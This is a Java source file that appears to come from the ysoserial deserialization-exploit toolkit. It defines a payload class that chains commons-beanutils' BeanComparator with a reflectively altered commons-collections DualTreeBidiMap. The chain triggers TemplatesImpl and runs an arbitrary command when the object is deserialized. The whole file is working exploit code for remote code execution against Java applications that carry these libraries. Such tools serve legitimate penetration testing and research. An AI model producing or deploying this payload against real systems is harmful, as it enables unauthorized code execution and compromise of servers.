package ysoserial.payloads;

import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.collections.bidimap.AbstractDualBidiMap;
import org.apache.commons.collections.bidimap.DualTreeBidiMap;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1"})
@Authors({Authors.Y4ER})
public class CommonsBeanutils192WithDualTreeBidiMap implements ObjectPayload<Object> {

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsBeanutils192WithDualTreeBidiMap.class, args);
    }

    public Object getObject(final String command) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl(command);
        final BeanComparator comparator = new BeanComparator("outputProperties", String.CASE_INSENSITIVE_ORDER);

        DualTreeBidiMap dualTreeBidiMap = new DualTreeBidiMap();
        HashMap<Object, Object> map = new HashMap<>();
        map.put(templates, templates);

        Reflections.setFieldValue(dualTreeBidiMap, "comparator", comparator);

        Field field = AbstractDualBidiMap.class.getDeclaredField("maps");
        field.setAccessible(true);
        Map[] maps = (Map[]) field.get(dualTreeBidiMap);
        maps[0] = map;

        return dualTreeBidiMap;
    }
}
